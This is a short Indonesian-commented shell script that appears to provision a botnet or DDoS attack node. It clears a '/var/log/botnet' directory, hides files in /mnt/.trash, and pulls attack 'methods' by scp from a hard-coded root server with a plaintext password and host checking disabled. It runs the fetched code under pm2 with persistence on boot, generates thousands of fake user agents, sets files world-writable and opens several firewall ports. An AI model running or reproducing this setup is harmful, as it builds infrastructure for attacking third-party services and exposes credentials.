# Install paket yang diperlukan
DEBIAN_FRONTEND=noninteractive apt install -y sshpass npm nodejs python3 build-essential squid

systemctl stop gendeng
# Membersihkan dan menyiapkan direktori
pkill node
pkill screen
rm -rf /mnt/.trash
rm -rf /var/log/botnet
mkdir /mnt/.trash
cd /mnt/.trash

# Memindahkan file dengan scp
sshpass -p 'CH1MZYYVPS' scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r root@152.42.222.251:/root/methods/* ./

# Menginstal NVM dan Node.js
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash
export NVM_DIR="$HOME/.nvm" && [ -s "$NVM_DIR/nvm.sh" ] && . "$NVM_DIR/nvm.sh"
nvm install 18 || echo 'Node.js sudah terpasang'
npm install
npm i -g pm2
pm2 stop all
pm2 start main.js
pm2 startup
pm2 save
pm2 restart all

# Mengatur firewall
ufw reload

# Menjalankan skrip perbaikan
cd ./lib/cache
chmod 777 *

# Memulai proses di screen
cd ../..
node ./lib/cache/uagen.js 10000 ua.txt

# Mengatur firewall untuk port yang diperlukan
ufw allow 812
ufw allow 4343
ufw allow 22
ufw allow 1201
ufw allow 443
ufw allow 80
ufw reload
